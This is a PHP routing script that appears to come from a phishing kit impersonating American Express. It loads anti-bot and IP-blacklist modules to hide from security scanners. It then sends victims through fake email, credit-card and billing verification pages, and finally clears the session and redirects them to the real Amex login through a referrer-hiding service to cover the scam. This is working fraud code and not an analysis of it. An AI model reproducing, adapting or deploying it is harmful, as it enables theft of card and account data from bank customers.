<?php
ob_start();
session_start();

include'../Anti/IP-BlackList.php';  
include'../Anti/Bot-Crawler.php';
include'../Anti/Bot-Spox.php';
include'../Anti/blacklist.php';
include'../Anti/new.php';
include'../Anti/Dila_DZ.php';

if(isset($_POST['submit'])&&isset($_POST['spox'])){
	include '../config.php';
	include '../Functions/Fuck-you.php';

    	$key = substr(sha1(mt_rand()),1,25);

	     if ($show_email_access=="yes") {
		exit(header("Location: ../../email_verification?amex_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
	     }

	     if ($show_credit_card=="yes") {
		exit(header("Location: ../../credit_verification?amex_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
	      }

 		if ($show_billing=="yes") {
		exit(header("Location: ../../billing?amex_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode'].""));
	      }

	      if ($show_success_page=="yes") {
		 exit(header("Location: ../../thanks?amex_id=".$key."&country=".$_SESSION['country']."&iso=".$_SESSION['countrycode']."")); 
	     }else{

		$helper = array_keys($_SESSION);
    		foreach ($helper as $key){
        		unset($_SESSION[$key]);
    			}
    		exit(header("Location: https://utilify.me/hide-referrer/https://amex.co/2kgS15Q")); // go to bank login page officiel..
	     }
 

  }else{
    header("HTTP/1.0 404 Not Found");
    exit();
}

?>